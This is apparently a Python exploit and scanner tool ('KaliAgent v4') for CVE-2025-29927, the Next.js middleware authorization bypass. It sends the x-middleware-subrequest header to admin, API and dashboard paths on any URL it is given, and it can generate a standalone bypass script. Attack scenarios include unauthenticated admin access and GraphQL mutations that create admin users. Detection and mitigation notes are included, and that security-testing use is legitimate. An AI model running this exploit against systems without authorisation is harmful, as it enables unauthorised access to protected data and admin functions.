#!/usr/bin/env python3
"""
🎯 KaliAgent v4 - CVE-2025-29927: Next.js Middleware Authorization Bypass

Complete demonstration of CVE-2025-29927 — a critical authorization
bypass in Next.js middleware. By sending the x-middleware-subrequest
header, attackers can bypass all middleware-based auth checks.

MITRE ATT&CK:
  - T1190: Exploit Public-Facing Application
  - T1068: Exploitation for Privilege Escalation

CWE-285: Improper Authorization

Attack Flow:
  1. Next.js app uses middleware for auth (common pattern)
  2. Middleware checks cookies/tokens before allowing access
  3. Attacker sends x-middleware-subrequest header
  4. Next.js interprets this as an internal subrequest
  5. Middleware re-enters but skips auth (thinks it's internal)
  6. Protected route returns data without authentication

⚠️  WARNING: For authorized security testing and education only.

Author: KaliAgent Team
Created: April 28, 2026
Version: 1.0.0
"""

import argparse
import sys
import logging
import json
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Optional, Dict
from pathlib import Path
from urllib.parse import urlparse

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger('CVE-2025-29927')


# =============================================================================
# VULNERABILITY DETAILS
# =============================================================================

AFFECTED_VERSIONS = [
    ">=1.11.4 <12.3.5",
    ">=13.0.0 <13.5.9",
    ">=14.0.0 <14.2.25",
    ">=15.0.0 <15.2.3",
]

PATCHED_VERSIONS = {
    "12": "12.3.5",
    "13": "13.5.9",
    "14": "14.2.25",
    "15": "15.2.3",
}

# The magic header that bypasses middleware
BYPASS_HEADER = "x-middleware-subrequest"

# Common middleware-protected paths to test
DEFAULT_TEST_PATHS = [
    "/api/admin",
    "/api/users",
    "/api/settings",
    "/api/internal",
    "/dashboard",
    "/admin",
    "/api/auth/session",
    "/api/auth/me",
    "/api/graphql",
    "/_next/data/",
]


# =============================================================================
# SCAN RESULTS
# =============================================================================

@dataclass
class BypassAttempt:
    """Result of a single bypass attempt"""
    url: str
    method: str
    header_used: str
    status_code: int
    response_size: int
    bypassed: bool
    normal_status: int = 0
    normal_size: int = 0
    response_snippet: str = ""


@dataclass
class MiddlewareScenario:
    """Attack scenario definition"""
    name: str
    description: str
    technique: str
    mitre: str
    attack_steps: List[str] = field(default_factory=list)
    detection: List[str] = field(default_factory=list)
    mitigation: List[str] = field(default_factory=list)


SCENARIOS = [
    MiddlewareScenario(
        name="API Authorization Bypass",
        description="Next.js middleware checks auth token before allowing API access. "
                    "The x-middleware-subrequest header causes the middleware to treat the "
                    "request as an internal subrequest, skipping auth checks entirely.",
        technique="Header Injection Authorization Bypass",
        mitre="T1190",
        attack_steps=[
            "1. Identify Next.js application with middleware auth",
            "2. Send normal request to /api/admin → 401/403 Unauthorized",
            "3. Send same request with x-middleware-subrequest header",
            "4. Next.js middleware re-enters, thinks it's an internal subrequest",
            "5. Internal subrequest path skips auth middleware",
            "6. Protected API returns 200 OK with data",
        ],
        detection=[
            "Monitor for x-middleware-subrequest header in incoming requests",
            "Log middleware execution paths (internal vs external requests)",
            "Compare response patterns for same path with/without header",
            "WAF rule: block x-middleware-subrequest from external traffic",
            "IDS: alert on any request with x-middleware-* headers",
        ],
        mitigation=[
            "Upgrade Next.js to 12.3.5/13.5.9/14.2.25/15.2.3+",
            "Strip x-middleware-subrequest header at reverse proxy",
            "Add secondary auth check in API route handlers",
            "Use server-side session validation, not just middleware",
            "Implement defense-in-depth: middleware + route-level auth",
        ],
    ),
    MiddlewareScenario(
        name="Admin Dashboard Access",
        description="Many Next.js apps protect /admin and /dashboard routes via "
                    "middleware. The bypass allows unauthenticated access to admin "
                    "panels, user management, and sensitive configuration pages.",
        technique="Privilege Escalation via Header Manipulation",
        mitre="T1068",
        attack_steps=[
            "1. Identify admin/dashboard routes protected by middleware",
            "2. Attempt access without auth → redirected to /login",
            "3. Add x-middleware-subrequest: /admin/dashboard",
            "4. Server renders the page, bypassing middleware redirect",
            "5. Full admin interface accessible without credentials",
        ],
        detection=[
            "Monitor for access to admin paths without valid session cookies",
            "Log middleware redirect decisions (internal subrequest anomalies)",
            "Alert on admin page renders without corresponding auth events",
        ],
        mitigation=[
            "Upgrade Next.js to patched version",
            "Add server-side auth check in getServerSideProps/layout",
            "Use middleware + API-level auth as dual protection",
            "Restrict admin paths at the network level (IP allowlist)",
        ],
    ),
    MiddlewareScenario(
        name="GraphQL Schema Exposure",
        description="If the Next.js app exposes a GraphQL API protected by middleware, "
                    "the bypass allows unauthenticated introspection queries, revealing "
                    "the full schema and potentially executing mutations.",
        technique="API Schema Enumeration + Unauthorized Query Execution",
        mitre="T1190 + T1082",
        attack_steps=[
            "1. Identify /api/graphql endpoint protected by middleware",
            "2. Send introspection query with bypass header",
            "3. Full schema returned including mutations and admin types",
            "4. Use schema to craft targeted mutations (create admin user, etc.)",
            "5. Execute mutations with bypass header → unauthorized data modification",
        ],
        detection=[
            "Monitor for GraphQL introspection queries from unauthenticated sources",
            "Log GraphQL query depth and complexity metrics",
            "Alert on mutations executed without session tokens",
        ],
        mitigation=[
            "Upgrade Next.js to patched version",
            "Disable GraphQL introspection in production",
            "Add auth check in GraphQL context/resolver layer",
            "Use persisted queries instead of ad-hoc GraphQL",
        ],
    ),
]


# =============================================================================
# SCANNER ENGINE
# =============================================================================

class NextJsMiddlewareScanner:
    """
    Scanner for CVE-2025-29927 — Next.js middleware authorization bypass.

    Tests target URLs with and without the x-middleware-subrequest
    header to detect vulnerable middleware configurations.
    """

    VERSION = "1.0.0"

    def __init__(self):
        self.results: List[BypassAttempt] = []
        self.has_requests = False
        try:
            import requests
            self.has_requests = True
            self._requests = requests
        except ImportError:
            logger.warning("requests library not installed — scan will be simulation only")

    def scan_url(self, base_url: str, paths: List[str] = None,
                 headers: Dict = None) -> List[BypassAttempt]:
        """Scan a Next.js application for middleware bypass vulnerability"""
        paths = paths or DEFAULT_TEST_PATHS
        extra_headers = headers or {}

        if not self.has_requests:
            logger.info("📡 Simulation mode (install 'requests' for live scanning)")
            return self._simulate_scan(base_url, paths)

        results = []
        for path in paths:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                # Normal request
                normal_resp = self._requests.get(url, headers=extra_headers, timeout=10, allow_redirects=False)
                normal_status = normal_resp.status_code
                normal_size = len(normal_resp.content)

                # Bypass attempt
                bypass_headers = {**extra_headers, BYPASS_HEADER: path}
                bypass_resp = self._requests.get(url, headers=bypass_headers, timeout=10, allow_redirects=False)
                bypass_status = bypass_resp.status_code
                bypass_size = len(bypass_resp.content)

                # Detect bypass: different status code or significantly different size
                bypassed = False
                if bypass_status != normal_status:
                    if normal_status in [401, 403, 302, 307] and bypass_status == 200:
                        bypassed = True
                    elif normal_status == 200 and bypass_status == 200 and abs(bypass_size - normal_size) > 500:
                        bypassed = True

                result = BypassAttempt(
                    url=url, method="GET", header_used=BYPASS_HEADER,
                    status_code=bypass_status, response_size=bypass_size,
                    bypassed=bypassed, normal_status=normal_status,
                    normal_size=normal_size,
                    response_snippet=bypass_resp.text[:200] if bypassed else ""
                )
                results.append(result)

                if bypassed:
                    logger.warning(f"🔓 BYPASS DETECTED: {url}")
                    logger.warning(f"   Normal: {normal_status} ({normal_size}B)")
                    logger.warning(f"   Bypass: {bypass_status} ({bypass_size}B)")

            except Exception as e:
                logger.debug(f"Error scanning {url}: {e}")

        self.results = results
        return results

    def _simulate_scan(self, base_url: str, paths: List[str]) -> List[BypassAttempt]:
        """Generate simulated results for demonstration"""
        results = []
        for path in paths:
            url = f"{base_url.rstrip('/')}{path}"
            # Simulate: auth-protected paths show bypass potential
            is_protected = any(p in path for p in ['admin', 'api/admin', 'dashboard', 'internal', 'settings'])
            normal_status = 401 if is_protected else 200
            bypass_status = 200 if is_protected else 200
            normal_size = 50 if is_protected else 5000
            bypass_size = 5000 if is_protected else 5000

            results.append(BypassAttempt(
                url=url, method="GET", header_used=BYPASS_HEADER,
                status_code=bypass_status, response_size=bypass_size,
                bypassed=is_protected,
                normal_status=normal_status, normal_size=normal_size,
                response_snippet="{'users': [...]}" if is_protected else ""
            ))
        self.results = results
        return results

    def generate_payload_script(self, target_url: str, output_path: str = None) -> str:
        """Generate a Python script that tests the bypass"""
        script = f'''#!/usr/bin/env python3
"""CVE-2025-29927 Next.js Middleware Bypass Test Script
Generated by KaliAgent v4
Target: {target_url}
"""
import sys
try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

TARGET = "{target_url}"
HEADER = "x-middleware-subrequest"
PATHS = {json.dumps(DEFAULT_TEST_PATHS, indent=4)}

def test_bypass(base_url, path):
    url = f"{{base_url}}{{path}}"
    # Normal request
    r1 = requests.get(url, allow_redirects=False, timeout=10)
    # Bypass request
    r2 = requests.get(url, headers={{HEADER: path}}, allow_redirects=False, timeout=10)

    bypassed = (r1.status_code in [401, 403, 302] and r2.status_code == 200)
    print(f"  {{path:40s}} normal={{r1.status_code}} bypass={{r2.status_code}} {{'🔓 BYPASS' if bypassed else '✅'}}")
    return bypassed

if __name__ == "__main__":
    print(f"🎯 Testing {{TARGET}} for CVE-2025-29927...")
    found = sum(1 for p in PATHS if test_bypass(TARGET, p))
    print(f"\\nResults: {{found}} bypass(es) found out of {{len(PATHS)}} paths")
'''
        if output_path:
            Path(output_path).write_text(script)
            logger.info(f"📝 Payload script saved to {output_path}")
        return script


# =============================================================================
# DEMO ORCHESTRATOR
# =============================================================================

class CVE2025_29927_Demo:
    """Complete demonstration orchestrator for CVE-2025-29927."""

    VERSION = "1.0.0"

    def __init__(self):
        self.scanner = NextJsMiddlewareScanner()

    def print_attack_flow(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║       CVE-2025-29927 — NEXT.JS MIDDLEWARE BYPASS FLOW          ║
╚══════════════════════════════════════════════════════════════════╝

  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
  │   Attacker   │     │   Next.js    │     │  Middleware   │
  │   (Browser)  │     │   Server     │     │  Auth Check  │
  └──────┬───────┘     └──────┬───────┘     └──────┬───────┘
         │                    │                     │
    1. Request GET         2. Server               │
       /api/admin            receives request       │
         │                    │                     │
         │                    │   3. Middleware      │
         │                    │   checks auth ─────►│
         │                    │                     │
         │                    │   4. No cookie →   │
         │                    │   401/redirect ◄────│
         │                    │                     │
    5. Request GET         6. Server               │
       /api/admin            receives request       │
       + x-middleware-       │                     │
         subrequest           │   7. Middleware     │
         │                    │   sees INTERNAL ───►│
         │                    │                     │
         │                    │   8. Internal      │
         │                    │   subrequest →     │
         │                    │   SKIP AUTH ◄──────│
         │                    │                     │
         │            9. Protected data returned   │
         │            200 OK with admin data       │
         ▼                    ▼                     ▼

  KEY INSIGHT: Next.js uses an internal header
  (x-middleware-subrequest) to track when middleware
  re-enters during subrequest processing. The bug:
  this header is trusted from ALL sources, including
  external attacker requests. The middleware sees the
  header, thinks "I'm already processing this as a
  subrequest", and skips the auth check.""")

    def print_scenario(self, idx: int):
        sc = SCENARIOS[idx]
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║  CVE-2025-29927: {sc.name:<45}║
╚══════════════════════════════════════════════════════════════════╝

📋 {sc.description}

🎯 TECHNIQUE: {sc.technique}
   MITRE ATT&CK: {sc.mitre}

🔄 ATTACK STEPS:""")
        for s in sc.attack_steps:
            print(f"  {s}")
        print(f"\n🔍 DETECTION:")
        for d in sc.detection:
            print(f"  • {d}")
        print(f"\n🛡️  MITIGATION:")
        for m in sc.mitigation:
            print(f"  • {m}")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-29927: Next.js Middleware Authorization Bypass Demo")
    sub = parser.add_subparsers(dest='command')

    sub.add_parser('explain', help='Show attack flow and scenarios')

    scan = sub.add_parser('scan', help='Scan a Next.js app for bypass vulnerability')
    scan.add_argument('url', help='Target URL (e.g., https://app.example.com)')
    scan.add_argument('--paths', nargs='*', help='Custom paths to test')

    generate = sub.add_parser('generate', help='Generate bypass test script')
    generate.add_argument('url', help='Target URL')
    generate.add_argument('--output', default='cve-2025-29927-test.py')

    report = sub.add_parser('report', help='Generate scan report')
    report.add_argument('--output', default='cve-2025-29927-report.txt')

    args = parser.parse_args()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║  🔓 CVE-2025-29927: Next.js Middleware Authorization Bypass   ║
║     CWE-285 | CVSS 9.1 | MITRE T1190                        ║
║     KaliAgent v4 Integration                                  ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  WARNING: For authorized security testing and education only.
""")

    demo = CVE2025_29927_Demo()

    if args.command == 'explain':
        demo.print_attack_flow()
        for i in range(len(SCENARIOS)):
            demo.print_scenario(i)

    elif args.command == 'scan':
        results = demo.scanner.scan_url(args.url, args.paths)
        print(f"\n🎯 Scan Results for {args.url}:")
        bypass_count = 0
        for r in results:
            icon = "🔓 BYPASS" if r.bypassed else "✅"
            print(f"  {icon} {r.url}")
            print(f"     Normal: {r.normal_status} ({r.normal_size}B) | Bypass: {r.status_code} ({r.response_size}B)")
            if r.bypassed:
                bypass_count += 1
        print(f"\n📊 {bypass_count}/{len(results)} paths show bypass potential")

    elif args.command == 'generate':
        demo.scanner.generate_payload_script(args.url, args.output)

    elif args.command == 'report':
        report = []
        report.append("=" * 70)
        report.append("NEXT.JS MIDDLEWARE BYPASS AUDIT (CVE-2025-29927)")
        report.append("=" * 70)
        report.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Tool: KaliAgent v4 — CVE-2025-29927 Demo v{demo.VERSION}")
        report.append("")
        report.append("AFFECTED VERSIONS:")
        for v in AFFECTED_VERSIONS:
            report.append(f"  - {v}")
        report.append("")
        report.append("PATCHED VERSIONS:")
        for major, patch in PATCHED_VERSIONS.items():
            report.append(f"  - Next.js {major}.x → {patch}+")
        report.append("")
        for i, sc in enumerate(SCENARIOS):
            report.append(f"\nSCENARIO {i+1}: {sc.name}")
            report.append(f"  {sc.description}")
            report.append("  MITIGATION:")
            for m in sc.mitigation:
                report.append(f"    - {m}")
        Path(args.output).write_text("\n".join(report))
        print(f"📊 Report saved to {args.output}")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()